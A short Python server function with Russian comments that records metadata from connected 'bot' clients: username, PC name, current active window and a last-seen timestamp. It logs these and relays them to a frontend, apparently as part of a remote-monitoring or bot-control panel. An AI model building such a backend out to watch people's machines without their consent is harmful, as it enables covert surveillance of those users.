from logs import Log as logger
# Импортируем словари состояний из твоего основного сервиса
# Предположим, они лежат в backend.Services или там, где ты их объявил
from backend.Services import client_info


def data_scribe(data: dict) -> dict | None:
    """
    Обрабатывает метаданные бота, обновляет глобальное состояние сервера
    и возвращает данные для трансляции на фронтенд.
    """
    try:
        client_id = data.get("id")
        if not client_id:
            logger.warning("[DataScribe] Получены данные без ID клиента.")
            return data

        # 1. ОБНОВЛЕНИЕ ГЛОБАЛЬНОГО СОСТОЯНИЯ (Source of Truth)
        # Если клиент уже есть в словаре, обновляем его поля новыми данными
        if client_id in client_info:
            client_info[client_id].update(data)
            # Обновляем метку времени, чтобы знать, что бот "жив"
            import time
            client_info[client_id]["last_active"] = time.strftime("%H:%M:%S")
        else:
            # Если это новый клиент (хотя он должен быть в словаре после handshake)
            client_info[client_id] = data

        # 2. ЛОГИРОВАНИЕ
        client_user = data.get("user", "Unknown")
        pc_name = data.get("pc_name", "Unknown")
        active_window = data.get("activeWindow", "N/A")

        logger.info(f"[DataScribe] Update from {client_id} ({client_user}@{pc_name}): Window -> {active_window}")

        # 3. ВОЗВРАТ
        # Воркер получит этот dict и отправит его в API для мгновенного пуша на фронтенд
        return data

    except Exception as e:
        logger.error(f"[DataScribe] Ошибка обработки данных: {e}")
        return None